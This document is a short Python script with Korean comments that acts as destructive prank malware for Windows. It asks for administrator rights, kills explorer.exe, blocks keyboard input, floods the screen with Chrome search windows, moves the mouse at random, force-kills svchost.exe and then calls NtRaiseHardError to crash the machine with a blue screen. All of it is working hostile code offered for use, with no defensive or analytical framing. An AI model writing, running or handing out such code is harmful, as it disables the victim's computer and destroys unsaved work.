import os
import ctypes
import threading
import time
import sys
import subprocess
import random
import keyboard
import pyautogui

# 설정
pyautogui.FAILSAFE = False
CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

def block_input():
    # 키보드 입력 하드웨어 레벨 차단
    for i in range(150):
        try: keyboard.block_key(i)
        except: pass

def search_bomb():
    search_terms = ["컴퓨터 바이러스 없애는 법", "마인크래프트 무료 설치", "마이크로소프트를 훔치는 법", "Visual Studio 2020에서 Python으로 바이러스 만드는 법", "학교 때려치는 법", "Pepe the frog", "아 배고프다", "헤헤헤헿ㅎㅎㅎ"]
    while True:
        term = random.choice(search_terms)
        subprocess.Popen([CHROME_PATH, "--new-window", f"https://www.google.com/search?q={term}"])
        time.sleep(0.5)

def mouse_chaos():
    width, height = pyautogui.size()
    while True:
        pyautogui.moveTo(random.randint(0, width), random.randint(0, height))
        time.sleep(0.01)

def shadow_entropy():
    # 1. 시각적/기능적 난동 시작 (20초 동안)
    threading.Thread(target=search_bomb, daemon=True).start()
    threading.Thread(target=mouse_chaos, daemon=True).start()
    
    time.sleep(20) # 20초간 시스템 붕괴 전조
    
    # 2. 붕괴 시작
    os.system("taskkill /f /im svchost.exe") # 시스템 서비스 마비
    time.sleep(1)
    
    # 3. 커널 패닉 (BSOD)
    ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin():
        os.system("taskkill /f /im explorer.exe")
        threading.Thread(target=block_input, daemon=True).start()
        shadow_entropy()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
